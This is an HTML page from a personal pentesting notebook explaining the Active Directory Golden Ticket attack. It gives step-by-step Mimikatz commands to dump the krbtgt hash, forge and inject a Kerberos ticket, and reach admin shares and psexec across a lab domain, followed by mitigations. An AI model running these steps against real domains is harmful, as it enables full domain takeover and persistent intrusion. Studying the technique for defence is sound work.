@@ -1,0 +1,617 @@
+
+<!DOCTYPE html>
+
+
+<html lang="en" data-content_root="../../../" >
+
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <title>Golden Ticket &#8212; MyHackBook</title>
+  
+  
+  
+  <script data-cfasync="false">
+    document.documentElement.dataset.mode = localStorage.getItem("mode") || "";
+    document.documentElement.dataset.theme = localStorage.getItem("theme") || "";
+  </script>
+  <!--
+    this give us a css class that will be invisible only if js is disabled
+  -->
+  <noscript>
+    <style>
+      .pst-js-only { display: none !important; }
+
+    </style>
+  </noscript>
+  
+  <!-- Loaded before other Sphinx assets -->
+  <link href="../../../_static/styles/theme.css?digest=8878045cc6db502f8baf" rel="stylesheet" />
+<link href="../../../_static/styles/pydata-sphinx-theme.css?digest=8878045cc6db502f8baf" rel="stylesheet" />
+
+    <link rel="stylesheet" type="text/css" href="../../../_static/pygments.css?v=8f2a1f02" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/styles/sphinx-book-theme.css?v=3c74b3bc" />
+  
+  <!-- So that users can add custom icons -->
+  <script src="../../../_static/scripts/fontawesome.js?digest=8878045cc6db502f8baf"></script>
+  <!-- Pre-loaded scripts that we'll load fully later -->
+  <link rel="preload" as="script" href="../../../_static/scripts/bootstrap.js?digest=8878045cc6db502f8baf" />
+<link rel="preload" as="script" href="../../../_static/scripts/pydata-sphinx-theme.js?digest=8878045cc6db502f8baf" />
+
+    <script src="../../../_static/documentation_options.js?v=e1a75a79"></script>
+    <script src="../../../_static/doctools.js?v=fd6eb6e6"></script>
+    <script src="../../../_static/sphinx_highlight.js?v=6ffebe34"></script>
+    <script src="../../../_static/scripts/sphinx-book-theme.js?v=fab101a9"></script>
+    <script>DOCUMENTATION_OPTIONS.pagename = 'Active Directory/attacking-ad/post-domain-compromise-attacks/golden-ticket';</script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" />
+    <link rel="next" title="Web App Pentesting" href="../../../Web%20App%20Pentesting/index.html" />
+    <link rel="prev" title="Dumping the NTDS.dit" href="ntds-dumping.html" />
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta name="docsearch:language" content="en"/>
+  <meta name="docsearch:version" content="" />
+  </head>
+  
+  
+  <body data-bs-spy="scroll" data-bs-target=".bd-toc-nav" data-offset="180" data-bs-root-margin="0px 0px -60%" data-default-mode="">
+
+  
+  
+  <div id="pst-skip-link" class="skip-link d-print-none"><a href="#main-content">Skip to main content</a></div>
+  
+  <div id="pst-scroll-pixel-helper"></div>
+  
+  <button type="button" class="btn rounded-pill" id="pst-back-to-top">
+    <i class="fa-solid fa-arrow-up"></i>Back to top</button>
+
+  
+  <dialog id="pst-search-dialog">
+    
+<form class="bd-search d-flex align-items-center"
+      action="../../../search.html"
+      method="get">
+  <i class="fa-solid fa-magnifying-glass"></i>
+  <input type="search"
+         class="form-control"
+         name="q"
+         placeholder="Search..."
+         aria-label="Search..."
+         autocomplete="off"
+         autocorrect="off"
+         autocapitalize="off"
+         spellcheck="false"/>
+  <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd>K</kbd></span>
+</form>
+  </dialog>
+
+  <div class="pst-async-banner-revealer d-none">
+  <aside id="bd-header-version-warning" class="d-none d-print-none" aria-label="Version warning"></aside>
+</div>
+
+  
+    <header class="bd-header navbar navbar-expand-lg bd-navbar d-print-none">
+    </header>
+  
+
+  <div class="bd-container">
+    <div class="bd-container__inner bd-page-width">
+      
+      
+      
+      <dialog id="pst-primary-sidebar-modal"></dialog>
+      <div id="pst-primary-sidebar" class="bd-sidebar-primary bd-sidebar">
+        
+
+  
+  <div class="sidebar-header-items sidebar-primary__section">
+    
+    
+    
+    
+  </div>
+  
+    <div class="sidebar-primary-items__start sidebar-primary__section">
+        <div class="sidebar-primary-item">
+
+  
+    
+  
+
+<a class="navbar-brand logo" href="../../../index.html">
+  
+  
+  
+  
+  
+    
+    
+      
+    
+    
+    <img src="../../../_static/Logo.png" class="logo__image only-light" alt="MyHackBook - Home"/>
+    <img src="../../../_static/Logo.png" class="logo__image only-dark pst-js-only" alt="MyHackBook - Home"/>
+  
+  
+</a></div>
+        <div class="sidebar-primary-item">
+
+<button class="btn search-button-field search-button__button pst-js-only" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
+ <i class="fa-solid fa-magnifying-glass"></i>
+ <span class="search-button__default-text">Search</span>
+ <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd class="kbd-shortcut__modifier">K</kbd></span>
+</button></div>
+        <div class="sidebar-primary-item"><nav class="bd-links bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item navbar-nav active">
+        <p aria-level="2" class="caption" role="heading"><span class="caption-text">Contents</span></p>
+<ul class="current nav bd-sidenav">
+<li class="toctree-l1"><a class="reference internal" href="../../../start-here.html">-&gt; Start Here</a></li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../Fundamentals/index.html">Fundamentals</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../Fundamentals/shells.html">Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../Fundamentals/payloads.html">Payloads</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../Fundamentals/password-attacks.html">Password Attacks 101</a></li>
+</ul>
+</details></li>
+<li class="toctree-l1 current active has-children"><a class="reference internal" href="../../index.html">Active Directory</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../../basics.html">Basics</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../example-lab.html">Example AD Lab</a></li>
+<li class="toctree-l2 current active has-children"><a class="reference internal" href="../index.html">Attacking AD</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../initial-attack-vectors/index.html">Initial Attack Vectors</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
+<li class="toctree-l4"><a class="reference internal" href="../initial-attack-vectors/llmnr-poisoning.html">LLMNR Poisoning</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../initial-attack-vectors/smb-relay.html">SMB Relay</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../initial-attack-vectors/ipv6-attacks.html">IPv6 Attacks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../initial-attack-vectors/passback-attacks.html">Passback Attacks</a></li>
+</ul>
+</details></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../enumeration/index.html">Enumeration</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
+<li class="toctree-l4"><a class="reference internal" href="../enumeration/credentials-injection.html">Credentials Injection</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../enumeration/manual-enumeration.html">Manual Enumeration Techniques</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../enumeration/enumeration-with-ldapdomaindump.html">Enumeration with ldapdomaindump</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../enumeration/enumeration-with-bloodhound.html">Enumeration with Bloodhound</a></li>
+</ul>
+</details></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../post-compromise-attacks/index.html">Post Compromise Attacks</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
+<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/pass-attacks.html">Pass Attacks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/mimikatz.html">Mimikatz</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/kerberoasting.html">Kerberoasting</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/token-impersonation.html">Token Impersonation</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/lnk-file-attacks.html">LNK File Attacks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/gpp-cPassword-attacks.html">GPP cPassword Attacks</a></li>
+</ul>
+</details></li>
+<li class="toctree-l3 current active has-children"><a class="reference internal" href="index.html">Post Domain Compromise Attacks</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="ntds-dumping.html">Dumping the NTDS.dit</a></li>
+<li class="toctree-l4 current active"><a class="current reference internal" href="#">Golden Ticket</a></li>
+</ul>
+</details></li>
+</ul>
+</details></li>
+</ul>
+</details></li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../Web%20App%20Pentesting/index.html">Web App Pentesting</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../Web%20App%20Pentesting/xss.html">Cross-Site Scripting (XSS)</a></li>
+</ul>
+</details></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../Scripts%20and%20Tools/index.html">Scripts and Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../Blogs/index.html">Blogs</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../Writeups/index.html">Writeups</a></li>
+</ul>
+
+    </div>
+</nav></div>
+    </div>
+  
+  
+  <div class="sidebar-primary-items__end sidebar-primary__section">
+      <div class="sidebar-primary-item">
+<div id="ethical-ad-placement"
+      class="flat"
+      data-ea-publisher="readthedocs"
+      data-ea-type="readthedocs-sidebar"
+      data-ea-manual="true">
+</div></div>
+  </div>
+
+
+      </div>
+      
+      <main id="main-content" class="bd-main" role="main">
+        
+        
+
+<div class="sbt-scroll-pixel-helper"></div>
+
+          <div class="bd-content">
+            <div class="bd-article-container">
+              
+              <div class="bd-header-article d-print-none">
+<div class="header-article-items header-article__inner">
+  
+    <div class="header-article-items__start">
+      
+        <div class="header-article-item"><button class="sidebar-toggle primary-toggle btn btn-sm" title="Toggle primary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+  <span class="fa-solid fa-bars"></span>
+</button></div>
+      
+    </div>
+  
+  
+    <div class="header-article-items__end">
+      
+        <div class="header-article-item">
+
+<div class="article-header-buttons">
+
+
+<a href="https://github.com/RayenManai/MyHackBook" target="_blank"
+   class="btn btn-sm btn-source-repository-button"
+   title="Source repository"
+   data-bs-placement="bottom" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fab fa-github"></i>
+  </span>
+
+</a>
+
+
+
+
+
+
+<div class="dropdown dropdown-download-buttons">
+  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Download this page">
+    <i class="fas fa-download"></i>
+  </button>
+  <ul class="dropdown-menu">
+      
+      
+      
+      <li><a href="../../../_sources/Active Directory/attacking-ad/post-domain-compromise-attacks/golden-ticket.md" target="_blank"
+   class="btn btn-sm btn-download-source-button dropdown-item"
+   title="Download source file"
+   data-bs-placement="left" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-file"></i>
+  </span>
+<span class="btn__text-container">.md</span>
+</a>
+</li>
+      
+      
+      
+      
+      <li>
+<button onclick="window.print()"
+  class="btn btn-sm btn-download-pdf-button dropdown-item"
+  title="Print to PDF"
+  data-bs-placement="left" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-file-pdf"></i>
+  </span>
+<span class="btn__text-container">.pdf</span>
+</button>
+</li>
+      
+  </ul>
+</div>
+
+
+
+
+<button onclick="toggleFullScreen()"
+  class="btn btn-sm btn-fullscreen-button pst-navbar-icon"
+  title="Fullscreen mode"
+  data-bs-placement="bottom" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-expand"></i>
+  </span>
+
+</button>
+
+
+
+<button class="btn btn-sm nav-link pst-navbar-icon theme-switch-button pst-js-only" aria-label="Color mode" data-bs-title="Color mode"  data-bs-placement="bottom" data-bs-toggle="tooltip">
+  <i class="theme-switch fa-solid fa-sun                fa-lg" data-mode="light" title="Light"></i>
+  <i class="theme-switch fa-solid fa-moon               fa-lg" data-mode="dark"  title="Dark"></i>
+  <i class="theme-switch fa-solid fa-circle-half-stroke fa-lg" data-mode="auto"  title="System Settings"></i>
+</button>
+
+
+<button class="btn btn-sm pst-navbar-icon search-button search-button__button pst-js-only" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <i class="fa-solid fa-magnifying-glass fa-lg"></i>
+</button>
+<button class="sidebar-toggle secondary-toggle btn btn-sm pst-navbar-icon" title="Toggle secondary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <span class="fa-solid fa-list"></span>
+</button>
+</div></div>
+      
+    </div>
+  
+</div>
+</div>
+              
+              
+
+<div id="jb-print-docs-body" class="onlyprint">
+    <h1>Golden Ticket</h1>
+    <!-- Table of contents -->
+    <div id="print-main-content">
+        <div id="jb-print-toc">
+            
+            <div>
+                <h2> Contents </h2>
+            </div>
+            <nav aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#overview">Overview</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#walkthrough">Walkthrough</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#obtain-the-krbtgt-ntlm-hash-and-domain-sid">1. Obtain the krbtgt NTLM Hash and Domain SID</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#create-the-golden-ticket">2. Create the Golden Ticket</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#launch-a-new-command-prompt-with-the-injected-ticket">3. Launch a New Command Prompt with the Injected Ticket</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#access-resources-across-the-domain">4. Access Resources Across the Domain</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#alternative-create-golden-ticket-without-ptt">Alternative: Create Golden Ticket Without /ptt</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a></li>
+</ul>
+            </nav>
+        </div>
+    </div>
+</div>
+
+              
+                
+<div id="searchbox"></div>
+                <article class="bd-article">
+                  
+  <section id="golden-ticket">
+<h1>Golden Ticket<a class="headerlink" href="#golden-ticket" title="Link to this heading">#</a></h1>
+<section id="overview">
+<h2>Overview<a class="headerlink" href="#overview" title="Link to this heading">#</a></h2>
+<p>A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) that grants complete access to every machine and resource in the domain. Unlike pass-the-hash or pass-the-ticket attacks that rely on existing tickets, a Golden Ticket is artificially created by an attacker who has compromised the <code class="docutils literal notranslate"><span class="pre">krbtgt</span></code> account.</p>
+<p><strong>Why is it powerful?</strong></p>
+<ul class="simple">
+<li><p>When you compromise the <code class="docutils literal notranslate"><span class="pre">krbtgt</span></code> account (the Kerberos TGT account), you own the domain.</p></li>
+<li><p>The <code class="docutils literal notranslate"><span class="pre">krbtgt</span></code> account’s NTLM hash is the cryptographic key used to sign all TGTs in the domain.</p></li>
+<li><p>By forging a TGT signed with this key, the domain controller will blindly trust it, granting you access to any service or resource in the domain.</p></li>
+<li><p>Golden Tickets are persistent and difficult to detect, as they are cryptographically valid and bypass normal authentication checks.</p></li>
+<li><p>Unlike regular accounts that can be disabled or have passwords changed, revoking a Golden Ticket requires resetting the <code class="docutils literal notranslate"><span class="pre">krbtgt</span></code> password (twice, due to password history).</p></li>
+</ul>
+</section>
+<section id="walkthrough">
+<h2>Walkthrough<a class="headerlink" href="#walkthrough" title="Link to this heading">#</a></h2>
+<section id="obtain-the-krbtgt-ntlm-hash-and-domain-sid">
+<h3>1. Obtain the krbtgt NTLM Hash and Domain SID<a class="headerlink" href="#obtain-the-krbtgt-ntlm-hash-and-domain-sid" title="Link to this heading">#</a></h3>
+<p><strong>Where is this step run?</strong></p>
+<p>To dump the krbtgt hash, you must have access to the <strong>Domain Controller itself</strong>. This requires either:</p>
+<ul class="simple">
+<li><p>Direct access to a DC (via RDP, psexec, etc. with admin credentials)</p></li>
+<li><p>Access to a backup of NTDS.dit</p></li>
+<li><p>Running this step from a DC you’ve already compromised</p></li>
+</ul>
+<p>Use Mimikatz (running on the DC with SYSTEM privileges) to dump the credentials of the <code class="docutils literal notranslate"><span class="pre">krbtgt</span></code> account and identify the domain SID:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mimikatz.exe
+mimikatz<span class="w"> </span><span class="c1"># privilege::debug</span>
+mimikatz<span class="w"> </span><span class="c1"># lsadump::lsa /inject /name:krbtgt</span>
+</pre></div>
+</div>
+<p>This command outputs:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Domain</span> <span class="p">:</span> <span class="n">MARVEL</span> <span class="o">/</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1234567890</span><span class="o">-</span><span class="mi">1234567890</span><span class="o">-</span><span class="mi">1234567890</span>
+<span class="n">RID</span>    <span class="p">:</span> <span class="mi">502</span> <span class="p">(</span><span class="n">krbtgt</span><span class="p">)</span>
+<span class="n">User</span>   <span class="p">:</span> <span class="n">krbtgt</span>
+<span class="n">Hash</span>   <span class="p">:</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">5</span><span class="n">f4dcc3b5aa765d61d8327deb882cf99</span>
+</pre></div>
+</div>
+<p>Record:</p>
+<ul class="simple">
+<li><p><strong>Domain SID</strong>: S-1-5-21-1234567890-1234567890-1234567890 (without the trailing RID)</p></li>
+<li><p><strong>krbtgt NTLM Hash</strong>: 5f4dcc3b5aa765d61d8327deb882cf99</p></li>
+<li><p><strong>Domain Name</strong>: marvel.local</p></li>
+</ul>
+</section>
+<section id="create-the-golden-ticket">
+<h3>2. Create the Golden Ticket<a class="headerlink" href="#create-the-golden-ticket" title="Link to this heading">#</a></h3>
+<p><strong>Where is this step run?</strong></p>
+<p>Once you have the krbtgt NTLM hash and domain SID, you can create and use the Golden Ticket from <strong>any compromised machine</strong> with administrative/SYSTEM privileges. This can be a workstation, server, or any other domain-joined machine you control.</p>
+<p>Using the domain SID and krbtgt hash, forge a Kerberos TGT with Mimikatz:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mimikatz<span class="w"> </span><span class="c1"># kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:5f4dcc3b5aa765d61d8327deb882cf99 /id:500 /ptt</span>
+</pre></div>
+</div>
+<p><strong>Parameters explained:</strong></p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">/User:Administrator</span></code>: The username to impersonate in the ticket (purely cosmetic for logging—can be any name, even non-existent accounts).</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">/domain:marvel.local</span></code>: The domain name.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">/sid:S-1-5-21-...</span></code>: The domain SID.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">/krbtgt:...</span></code>: The NTLM hash of the krbtgt account.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">/id:500</span></code>: <strong>The critical parameter</strong>, the RID (Relative Identifier) of the account to impersonate. RID 500 is always the built-in Administrator account, which carries Domain Admins group membership by default. The username in <code class="docutils literal notranslate"><span class="pre">/User:</span></code> is just cosmetic; the <code class="docutils literal notranslate"><span class="pre">/id:</span></code> parameter is what determines the actual permissions. Since the ticket is signed with the krbtgt hash, the Domain Controller trusts it completely and grants the group memberships (Domain Admins) associated with RID 500, allowing access to any resource in the domain.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">/ptt</span></code>: “Pass the Ticket”, inject the ticket directly into the current session.</p></li>
+</ul>
+</section>
+<section id="launch-a-new-command-prompt-with-the-injected-ticket">
+<h3>3. Launch a New Command Prompt with the Injected Ticket<a class="headerlink" href="#launch-a-new-command-prompt-with-the-injected-ticket" title="Link to this heading">#</a></h3>
+<p>Once the ticket is injected, open a new command prompt where the ticket will be active:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mimikatz<span class="w"> </span><span class="c1"># misc::cmd</span>
+</pre></div>
+</div>
+<p>This launches a new <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code> process with the Golden Ticket loaded.</p>
+</section>
+<section id="access-resources-across-the-domain">
+<h3>4. Access Resources Across the Domain<a class="headerlink" href="#access-resources-across-the-domain" title="Link to this heading">#</a></h3>
+<p>With the Golden Ticket injected, you can now access any resource or service in the domain:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Access file shares on domain computers</span>
+&gt;<span class="w"> </span>dir<span class="w"> </span><span class="se">\\</span>THEPUNISHER<span class="se">\c</span>$
+&gt;<span class="w"> </span>dir<span class="w"> </span><span class="se">\\</span>IRONMAN<span class="se">\c</span>$
+
+<span class="c1"># Execute commands remotely using psexec</span>
+&gt;<span class="w"> </span>psexec.exe<span class="w"> </span><span class="se">\\</span>THEPUNISHER<span class="w"> </span>cmd.exe
+
+<span class="c1"># List network resources</span>
+&gt;<span class="w"> </span>net<span class="w"> </span>view<span class="w"> </span><span class="se">\\</span>THEPUNISHER
+
+<span class="c1"># Access database servers, printers, and other services</span>
+</pre></div>
+</div>
+<p>The Golden Ticket grants you access to:</p>
+<ul class="simple">
+<li><p>File shares on all workstations and servers</p></li>
+<li><p>Remote administration tools (psexec, RDP, WinRM)</p></li>
+<li><p>SQL Server and other database services</p></li>
+<li><p>Printers, DHCP servers, and other network resources</p></li>
+</ul>
+</section>
+</section>
+<section id="alternative-create-golden-ticket-without-ptt">
+<h2>Alternative: Create Golden Ticket Without /ptt<a class="headerlink" href="#alternative-create-golden-ticket-without-ptt" title="Link to this heading">#</a></h2>
+<p>If you want to generate the Golden Ticket without immediately injecting it (for later use on a different machine):</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mimikatz<span class="w"> </span><span class="c1"># kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:5f4dcc3b5aa765d61d8327deb882cf99 /id:500 /ticket:golden.kirbi</span>
+</pre></div>
+</div>
+<p>This saves the ticket to <code class="docutils literal notranslate"><span class="pre">golden.kirbi</span></code>. You can then transfer this file and inject it on another machine using:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mimikatz<span class="w"> </span><span class="c1"># kerberos::ptt golden.kirbi</span>
+</pre></div>
+</div>
+</section>
+<section id="mitigations">
+<h2>Mitigations<a class="headerlink" href="#mitigations" title="Link to this heading">#</a></h2>
+<ul>
+<li><p><strong>Reset the krbtgt Password Twice</strong>: If you detect a Golden Ticket has been created, reset the <code class="docutils literal notranslate"><span class="pre">krbtgt</span></code> password twice (the second reset invalidates previously cached hashes). Note: This is disruptive and may cause authentication issues until the change replicates.</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-ADAccountPassword</span> <span class="n">-Identity</span> <span class="n">krbtgt</span> <span class="n">-Reset</span> <span class="n">-NewPassword</span> <span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="n">-AsPlainText</span> <span class="s2">&quot;NewComplexPassword&quot;</span> <span class="n">-Force</span><span class="p">)</span>
+</pre></div>
+</div>
+</li>
+<li><p><strong>Monitor for krbtgt Access</strong>: Alert on any attempts to dump or query the <code class="docutils literal notranslate"><span class="pre">krbtgt</span></code> account, which would indicate an attacker attempting this attack.</p></li>
+<li><p><strong>Implement Kerberos Armoring (EPA)</strong>: Enable Enforce Explicit Kerberos Armoring (EPA) to add extra protection to TGTs, making forged tickets detectable.</p></li>
+<li><p><strong>Run Kerberos Constrained Delegation Audits</strong>: Regularly audit which accounts have dangerous delegation rights that could be abused.</p></li>
+<li><p><strong>Restrict Domain Admin Accounts</strong>: Limit the number of accounts with Domain Admin privileges, reducing the likelihood of compromise.</p></li>
+<li><p><strong>Use Privileged Access Workstations (PAW)</strong>: Isolate high-privilege accounts on dedicated, hardened systems.</p></li>
+<li><p><strong>Monitor for Unusual TGT Requests</strong>: Implement monitoring for TGTs with unusual properties (e.g., excessively long lifetimes, unusual RIDs, unexpected users).</p></li>
+<li><p><strong>Implement Conditional Access</strong>: Use Azure AD Conditional Access or similar solutions to enforce MFA and restrict access based on risk factors.</p></li>
+<li><p><strong>Educate on Incident Response</strong>: Ensure your security team knows that detecting a Golden Ticket requires active monitoring and cannot be fully mitigated without resetting krbtgt (which is disruptive).</p></li>
+</ul>
+</section>
+</section>
+
+
+                </article>
+              
+
+              
+              
+              
+              
+                <footer class="prev-next-footer d-print-none">
+                  
+<div class="prev-next-area">
+    <a class="left-prev"
+       href="ntds-dumping.html"
+       title="previous page">
+      <i class="fa-solid fa-angle-left"></i>
+      <div class="prev-next-info">
+        <p class="prev-next-subtitle">previous</p>
+        <p class="prev-next-title">Dumping the NTDS.dit</p>
+      </div>
+    </a>
+    <a class="right-next"
+       href="../../../Web%20App%20Pentesting/index.html"
+       title="next page">
+      <div class="prev-next-info">
+        <p class="prev-next-subtitle">next</p>
+        <p class="prev-next-title">Web App Pentesting</p>
+      </div>
+      <i class="fa-solid fa-angle-right"></i>
+    </a>
+</div>
+                </footer>
+              
+            </div>
+            
+            
+              
+                <dialog id="pst-secondary-sidebar-modal"></dialog>
+                <div id="pst-secondary-sidebar" class="bd-sidebar-secondary bd-toc"><div class="sidebar-secondary-items sidebar-secondary__inner">
+
+
+  <div class="sidebar-secondary-item"><div
+    id="pst-page-navigation-heading-2"
+    class="page-toc tocsection onthispage">
+    <i class="fa-solid fa-list"></i> Contents
+  </div>
+  <nav id="pst-page-toc-nav" class="page-toc" aria-labelledby="pst-page-navigation-heading-2">
+    <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#overview">Overview</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#walkthrough">Walkthrough</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#obtain-the-krbtgt-ntlm-hash-and-domain-sid">1. Obtain the krbtgt NTLM Hash and Domain SID</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#create-the-golden-ticket">2. Create the Golden Ticket</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#launch-a-new-command-prompt-with-the-injected-ticket">3. Launch a New Command Prompt with the Injected Ticket</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#access-resources-across-the-domain">4. Access Resources Across the Domain</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#alternative-create-golden-ticket-without-ptt">Alternative: Create Golden Ticket Without /ptt</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a></li>
+</ul>
+  </nav></div>
+
+</div></div>
+              
+            
+          </div>
+          <footer class="bd-footer-content">
+            
+<div class="bd-footer-content__inner container">
+  
+  <div class="footer-item">
+    
+<p class="component-author">
+By Rayen Manai
+</p>
+
+  </div>
+  
+  <div class="footer-item">
+    
+
+  <p class="copyright">
+    
+      © Copyright 2025, Rayen Manai.
+      <br/>
+    
+  </p>
+
+  </div>
+  
+  <div class="footer-item">
+    
+  </div>
+  
+  <div class="footer-item">
+    
+  </div>
+  
+</div>
+          </footer>
+        
+
+      </main>
+    </div>
+  </div>
+  
+  <!-- Scripts loaded after <body> so the DOM is not blocked -->
+  <script defer src="../../../_static/scripts/bootstrap.js?digest=8878045cc6db502f8baf"></script>
+<script defer src="../../../_static/scripts/pydata-sphinx-theme.js?digest=8878045cc6db502f8baf"></script>
+
+  <footer class="bd-footer">
+  </footer>
+  </body>
+</html>
